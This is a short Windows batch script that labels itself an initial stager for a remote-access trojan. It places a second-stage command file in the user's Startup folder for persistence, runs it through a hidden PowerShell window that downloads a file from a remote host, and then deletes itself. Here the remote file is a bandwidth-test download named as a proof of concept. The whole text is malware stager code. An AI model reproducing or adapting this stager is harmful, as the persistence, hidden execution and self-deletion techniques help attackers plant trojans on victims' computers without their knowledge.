@REM initial stager for RAT
@REM created by : Reihtw

@REM variables
set INITIALPATH=%cd%
set STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup

@REM move into startup folder
cd %STARTUP%

@REM write payloads to startup folder
(
   powershell -c "Invoke-WebRequest -Uri 'ipv4.download.thinkbroadband.com/10MB.zip' -OutFile 'poc.zip'"
) > stage2.cmd

powershell Start-Process powershell.exe -windowstyle hidden "stage2.cmd"

cd %INITIALPATH%
del initial.cmd